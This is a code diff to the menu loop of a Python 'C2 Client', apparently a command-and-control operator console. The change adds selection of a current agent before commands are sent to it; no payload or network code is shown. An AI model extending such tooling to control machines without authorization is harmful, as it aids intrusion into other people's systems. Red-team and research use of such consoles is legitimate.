@@ -38,11 +38,15 @@ def main_loop():
     print("C2 Client")
     print("=========")
     
+    current_agent = None
+    
     while True:
         print("\nOptions:")
         print("1. List agents")
-        print("2. Send command")
-        print("3. Exit")
+        print("2. Select agent")
+        print("3. Send command")
+        print("4. Current agent")
+        print("5. Exit")
         
         choice = input("\nEnter choice: ")
         
@@ -50,10 +54,22 @@ def main_loop():
             print_agents()
         elif choice == '2':
             print_agents()
-            agent_id = input("Enter agent ID: ")
-            command = input("Enter command: ")
-            send_command(agent_id, command)
+            current_agent = input("Enter agent ID to select: ")
+            print(f"Selected agent: {current_agent}")
         elif choice == '3':
+            if not current_agent:
+                print("No agent selected. Please select an agent first.")
+                print_agents()
+                current_agent = input("Enter agent ID: ")
+            
+            command = input(f"Enter command for agent {current_agent}: ")
+            send_command(current_agent, command)
+        elif choice == '4':
+            if current_agent:
+                print(f"Current selected agent: {current_agent}")
+            else:
+                print("No agent currently selected.")
+        elif choice == '5':
             print("Exiting...")
             sys.exit(0)
         else:
